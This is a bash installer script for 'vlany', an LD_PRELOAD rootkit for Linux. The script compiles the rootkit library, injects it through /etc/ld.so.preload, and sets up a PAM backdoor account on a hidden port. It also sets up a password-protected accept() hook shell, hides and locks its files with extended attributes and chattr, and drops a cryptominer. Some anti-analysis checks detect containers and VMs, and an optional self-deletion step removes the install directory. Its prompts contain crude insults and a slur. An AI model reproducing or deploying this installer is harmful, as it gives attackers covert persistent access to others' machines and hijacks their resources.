#!/bin/bash

# errors and fatal risks
[ $(id -u) != 0 ] && { echo "Not root. Exiting."; exit; }
[ ! -e /proc ] && { echo "We're in a terrible jail. /proc doesn't exist. Exiting."; exit; }

[ ! -f `which gcc 2>/dev/null || echo "NO"` ] && { echo "Warning: gcc isn't installed on this box. Exiting. Install it."; exit; }

gcc misc/rm_preload.c -static -o misc/rm_preload
echo "Checking for current presence of (and removing, if necessary) ld.so.preload"
misc/rm_preload
rm misc/rm_preload
read -p "Press enter to continue, or ^C to exit."

# conditional warnings, credits to a certain individual
gcc misc/detect_lxc.c -o misc/detect_lxc
[[ $(misc/detect_lxc) == *"definitely in LXC"* ]] && { read -p "Warning: In an LXC container. Press enter to continue or ^C to exit."; }
rm misc/detect_lxc
[ -f `which sash 2>/dev/null || echo "NO"` ] && { read -p "Warning: sash is installed on this box. Press enter to continue or ^C to exit."; }
[ -d /proc/vz ] && { read -p "Warning: You're attempting to install vlany in an OpenVZ environment. Press enter to continue or ^C to exit."; }
[ -f /usr/bin/lveps ] && { read -p "Warning: You're attempting to install vlany in a CloudLinux LVE. Press enter to continue or ^C to exit."; }
[[ $(cat /proc/scsi/scsi 2>/dev/null | grep "VBOX") == *"VBOX"* ]] && { read -p "Warning: You're attempting to install vlany on a VirtualBox VM. Press enter to continue or ^C to exit."; }

# nothing fatal but still good to know
[ -d /proc/xen ] && { echo "Information: You're attempting to install vlany in a Xen environment. Don't worry about this too much."; }
[ ! "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] && { echo "UsePAM yes" >> /etc/ssh/sshd_config; }

CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
[[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] && { read -p "Warning: You're attempting to install vlany on a weird/alien filesystem. This is bad. Bailing."; exit; }
chattr -ia children &>/dev/null; rm -f children output

install_vlany_prerequisites ()
{
    if [ -f /usr/bin/yum ]; then
        yes | yum install make gcc pam-devel openssl-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 libpcap libpcap-devel &>/dev/null
    elif [ -f /usr/bin/apt-get ]; then
        dpkg --add-architecture i386 &>/dev/null
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install attr libpam0g-dev libpcap-dev libssl-dev libssl-dev:i386 gcc-multilib build-essential &>/dev/null
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
    elif [ -f /usr/bin/pacman ]; then
        pacman -Syy &>/dev/null
        pacman -S --noconfirm attr pam openssl libpcap base-devel &>/dev/null
    fi
}

vlany_install_dialog ()
{
    DIALOG_BIN="/usr/bin/dialog"

    echo "Installing dialog"
    if [ -f /usr/bin/yum ]; then
        yes | yum install dialog &>/dev/null
    elif [ -f /usr/bin/apt-get ]; then
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install dialog &>/dev/null
    elif [ -f /usr/bin/pacman ]; then
        pacman -Syy &>/dev/null
        pacman -S --noconfirm dialog &>/dev/null
    fi

    [ ! -f "$DIALOG_BIN" ] && { echo "$DIALOG_BIN was not found. Either install dialog and run this script again, or run this script with the --cli flag."; exit; }
}

get_vlany_settings ()
{
    if [ "$INSTALLING_IN_CLI" == "1" ]; then
        read -p "PAM backdoor username: "
        if [ -z $REPLY ]; then
            echo "LOLOL JUST KIDDING RETARD"
            exit
        fi
        V_USER=$REPLY

        read -p "PAM backdoor password: "
        if [ -z $REPLY ]; then
            echo "LOLOL JUST KIDDING RETARD"
            exit
        fi
        V_PASS=$REPLY

        PAM_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1)"
        read -p "Hidden PAM port [$PAM_PORT]: "
        if [ ! -z $REPLY ]; then
            PAM_PORT=$REPLY
        fi

        read -p "Optional SSL encryption for accept() hook backdoor (Yes/No) [No]: "
        if [ -z $REPLY ]; then
            SSL_STATUS=0
        elif [ "$REPLY" == "Yes" ]; then
            SSL_STATUS=1
        elif [ "$REPLY" == "No" ]; then
            SSL_STATUS=0
        else
            echo "Invalid response for SSL encryption option. Exiting."
            exit
        fi

        read -p "accept() shell password: "
        if [ -z $REPLY ]; then
            echo "LOLOL JUST KIDDING RETARD"
            exit
        fi
        ACCEPT_SHELL_PASSWORD=$REPLY

        LOW_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1)"
        read -p "accept() low port [$LOW_PORT]: "
        if [ ! -z $REPLY ]; then
            LOW_PORT=$REPLY
        fi

        HIGH_PORT="$(($LOW_PORT + $(cat /dev/urandom | tr -dc '2-5' | fold -w 1 | head -n 1)))"
        read -p "accept() high port [$HIGH_PORT]: "
        if [ ! -z $REPLY ]; then
            HIGH_PORT=$REPLY
        fi

        read -p "execve command password: "
        if [ -z $REPLY ]; then
            echo "LOLOL JUST KIDDING RETARD"
            exit
        fi
        EXECVE_PASS=$REPLY

        OBJECT_FILE_NAME="$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 12 | head -n 1)"
        read -p "Rootkit library name [$OBJECT_FILE_NAME]: "
        if [ ! -z $REPLY ]; then
            OBJECT_FILE_NAME=$REPLY
        fi

        INSTALL="/lib/libc.so.$V_USER.$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)"
        read -p "Hidden directory [$INSTALL]: "
        if [ ! -z $REPLY ]; then
            INSTALL=$REPLY
        fi

        ENV_VAR="$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 12 | head -n 1)"
        read -p "Environment variable [$ENV_VAR]: "
        if [ ! -z $REPLY ]; then
            ENV_VAR=$REPLY
        fi
    else
        V_USER=$(dialog --title "$TITLE" --inputbox "\nPAM backdoor username" 9 50 3>&1 1>&2 2>&3)
        V_PASS=$(dialog --title "$TITLE" --passwordbox "\nPAM backdoor password" 9 50 3>&1 1>&2 2>&3)

        PAM_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1)"
        PAM_PORT=$(dialog --title "$TITLE" --inputbox "\nHidden PAM port" 9 50 "$PAM_PORT" 3>&1 1>&2 2>&3)

        SSL_STATUS=$(dialog --title "$TITLE" --menu "Optional SSL encryption for accept() hook backdoor" 10 82 5 "No" "Disables SSL encryption in the accept backdoor" "Yes" "Enables SSL encryption, but requires an SSL enabled backdoor listener" 3>&1 1>&2 2>&3)
        [ "$SSL_STATUS" == "No" ] && { SSL_STATUS=0; }
        [ "$SSL_STATUS" == "Yes" ] && { SSL_STATUS=1; }

        ACCEPT_SHELL_PASSWORD=$(dialog --title "$TITLE" --passwordbox "\naccept() shell password" 9 50 3>&1 1>&2 2>&3)
        LOW_PORT="$(cat /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1)"
        LOW_PORT=$(dialog --title "$TITLE" --inputbox "\naccept() low port" 9 50 "$LOW_PORT" 3>&1 1>&2 2>&3)
        HIGH_PORT="$(($LOW_PORT + $(cat /dev/urandom | tr -dc '2-5' | fold -w 1 | head -n 1)))"
        HIGH_PORT=$(dialog --title "$TITLE" --inputbox "\naccept() high port" 9 50 "$HIGH_PORT" 3>&1 1>&2 2>&3)

        EXECVE_PASS=$(dialog --title "$TITLE" --passwordbox "\nexecve command password" 9 50 3>&1 1>&2 2>&3)

        OBJECT_FILE_NAME="$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 12 | head -n 1)"
        OBJECT_FILE_NAME=$(dialog --title "$TITLE" --inputbox "\nRootkit library name" 9 50 "$OBJECT_FILE_NAME" 3>&1 1>&2 2>&3)

        INSTALL="/lib/libc.so.$V_USER.$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)"
        INSTALL=$(dialog --title "$TITLE" --inputbox "\nHidden directory" 9 50 "$INSTALL" 3>&1 1>&2 2>&3)

        ENV_VAR="$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 12 | head -n 1)"
        ENV_VAR=$(dialog --title "$TITLE" --inputbox "\nEnvironment variable" 9 50 "$ENV_VAR" 3>&1 1>&2 2>&3)
    fi

    HIDDEN_XATTR_1_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
    HIDDEN_XATTR_2_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
    LIB_LOCATION="${INSTALL}/${OBJECT_FILE_NAME}.so.\$PLATFORM"
}

config_vlany ()
{
    # the argument passing to config.py looks fucking ugly im so sorry
    if [[ ! $(python2 config.py $INSTALL $LIB_LOCATION $HIDDEN_XATTR_1_STR $HIDDEN_XATTR_2_STR $V_USER $V_PASS $PAM_PORT $SSL_STATUS $ACCEPT_SHELL_PASSWORD $LOW_PORT $HIGH_PORT $EXECVE_PASS $ENV_VAR 0) == *"success"* ]]; then
        if [ "$INSTALLING_IN_CLI"  != "1" ]; then
            dialog --title "$TITLE" --infobox "Configuration failed. Exiting." 3 50 3>&1 1>&2 2>&3
        else
            echo "Configuration failed. Exiting."
        fi
        sleep 3
        clear
        exit
    fi
}

compile_vlany ()
{
    WARNING_FLAGS="-Wall -Wno-comment -Wno-unused-result"
    OPTIONS="-fomit-frame-pointer -fPIC"
    LINKER_OPTIONS="-Wl,--build-id=none"

    # no point in linking the libssl library if SSL isn't being used for the accept backdoor lol
    [ $SSL_STATUS == 1 ] && { LINKER_FLAGS="-ldl -lssl -lcrypt"; }
    [ $SSL_STATUS == 0 ] && { LINKER_FLAGS="-ldl -lcrypt"; }

    rm -rf *.so.*
    gcc -std=gnu99 -O0 vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.x86_64
    gcc -m32 -std=gnu99 -O0 vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
    strip ${OBJECT_FILE_NAME}.so.x86_64
    strip ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
}

install_vlany ()
{
    rm -rf $INSTALL/
    mkdir -p $INSTALL/
    [ "`uname -m`" == "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.x86_64 $INSTALL/${OBJECT_FILE_NAME}.v6l; }
    [ "`uname -m`" != "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.* $INSTALL/; }
    [ -f "/etc/ld.so.preload" ] && { chattr -ia /etc/ld.so.preload &>/dev/null; }
    echo -n $LIB_LOCATION > /etc/ld.so.preload
}

setup_vlany ()
{
    # remove compilation stuff
    export ${ENV_VAR}=1
    rm -rf *.so.* *.o

    echo "Date/time of vlany installation: $(date "+%a, %d %b %Y - %T")" >> $INSTALL/.vlany_information
    echo "PAM backdoor username: $V_USER" >> $INSTALL/.vlany_information
    echo "Hidden PAM port: $PAM_PORT" >> $INSTALL/.vlany_information
    echo "accept backdoor low port: $LOW_PORT" >> $INSTALL/.vlany_information
    echo "accept backdoor high port: $HIGH_PORT" >> $INSTALL/.vlany_information
    echo "Hidden directory: $INSTALL" >> $INSTALL/.vlany_information
    echo "Environment variable: $ENV_VAR" >> $INSTALL/.vlany_information

    # set up hidden directory
    echo '. .bashrc' > $INSTALL/.profile
    mv bashrc $INSTALL/.bashrc
    mv shell_msg $INSTALL/.shell_msg
    mv bd_readme $INSTALL/README
    cp misc/enter_lxc.c $INSTALL/enter_lxc.c
    cp misc/ssh.sh $INSTALL/ssh.sh
    cp misc/cpuminer-master.zip $INSTALL/cpuminer-master.zip
    mv minerd_setup.py $INSTALL/minerd_setup.py
    chmod +x $INSTALL/minerd_setup.py

    # protect files and directories
    setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} /etc/ld.so.preload
    setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* /etc/ld.so.preload
}

PYTHON_BIN=`which python`

echo "Installing python(2)"
if [ -f /usr/bin/yum ]; then
    yes | yum install python2 &>/dev/null
elif [ -f /usr/bin/apt-get ]; then
    yes | apt-get update &>/dev/null && sleep 1
    apt-get --yes --force-yes install python &>/dev/null
elif [ -f /usr/bin/pacman ]; then
    pacman -Syy &>/dev/null
    pacman -S --noconfirm python2 &>/dev/null
fi

[ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }

if [ "$1" == "--cli" ]; then
    echo "Installing vlany without a tui."

    read -p "Do you want to compile or install vlany? (enter 'compile' or 'install'): "
    [ -z $REPLY ] && { echo "Invalid option. Exiting."; exit; }
    if [ "$REPLY" == "install" ]; then
        echo "Regularly installing vlany."
        STATUS="install"
    elif [ "$REPLY" == "compile" ]; then
        echo "Compiling vlany."
        STATUS="compile"
    else
        echo "Invalid option. Exiting."
        exit
    fi

    echo "Installing prerequisite packages... Please wait."
    install_vlany_prerequisites
    echo "Packages installed."

    printf "\033[1;31mBeginning configuration. Please don't leave any options that don't have default values empty (options with default values have [VALUE] in them). I can't be bothered checking for empty input.\033[0m\n"

    INSTALLING_IN_CLI=1
    get_vlany_settings

    config_vlany

    echo "Compiling rootkit libraries."
    sleep 2
    compile_vlany
    echo "Rootkit libraries compiled."
    sleep 2

    [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme minerd_setup.py; exit; }

    echo "Installing vlany."
    sleep 1
    install_vlany
    echo "Installed."
    sleep 1

    echo "Setting up hidden directory and protecting files."
    sleep 1

    setup_vlany

    [ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }

    echo "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor."
    read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [YES]: "
    if [ -z $REPLY ]; then
        rm -rf `pwd`
    elif [ "$REPLY" == "YES" ]; then
        rm -rf `pwd`
    elif [ "$REPLY" == "NO" ]; then
        echo "Not removing `pwd`"
    else
        echo "Invalid option. Not removing."
    fi
else
    vlany_install_dialog

    TITLE="VLANY INSTALLATION"

    dialog --title "$TITLE" --msgbox "Welcome to the vlany installation script. Follow the prompts shown to install or compile vlany. Some options will already have default values, you can change them if you want to, but there's no need. When prompted for input, please don't leave it empty. I can't be bothered checking for empty input. Finally, remember that you can't see the password as you type it. You will be given more information after connecting to the ssh backdoor (use ssh.sh in directory misc/ to connect by use of the hidden PAM port). Hit enter to begin installation." 15 60

    dialog --title "$TITLE" --yesno "Do you want to install vlany?\n(Selecting 'No' will only compile it.)" 6 50 3>&1 1>&2 2>&3
    RESPONSE=$?

    [ $RESPONSE == 1 ] && { dialog --title "$TITLE" --msgbox "You're choosing to compile vlany. It will not be installed." 6 50; }

    dialog --title "$TITLE" --infobox "Installing prerequisite packages...\nPlease wait." 4 50 3>&1 1>&2 2>&3
    install_vlany_prerequisites
    dialog --title "$TITLE" --msgbox "Packages installed." 5 50

    get_vlany_settings

    config_vlany

    dialog --title "$TITLE" --infobox "Compiling rootkit libraries." 3 50 3>&1 1>&2 2>&3
    sleep 2
    compile_vlany
    dialog --title "$TITLE" --infobox "Rootkit libraries compiled." 3 50 3>&1 1>&2 2>&3
    sleep 2

    if [ $RESPONSE == 1 ]; then
        rm -rf *.o bashrc shell_msg bd_readme minerd_setup.py
        clear
        exit
    fi

    dialog --title "$TITLE" --infobox "Installing vlany." 7 25 3>&1 1>&2 2>&3
    sleep 1
    install_vlany
    dialog --title "$TITLE" --infobox "Installed." 7 20 3>&1 1>&2 2>&3
    sleep 1

    dialog --title "$TITLE" --infobox "Setting up hidden directory and protecting files." 7 40 3>&1 1>&2 2>&3
    sleep 1

    setup_vlany

    [ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }

    AUTO_RM=$(dialog --title "$TITLE" --menu "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor.\n\nDo you want to automatically remove this directory? (`pwd`)" 20 30 20 "No" "" "Yes" "" 3>&1 1>&2 2>&3)
    [ "$AUTO_RM" == "Yes" ] && { rm -rf `pwd`; }
fi

clear
cat $INSTALL/.vlany_information
echo "Thank you for choosing vlany."
exit
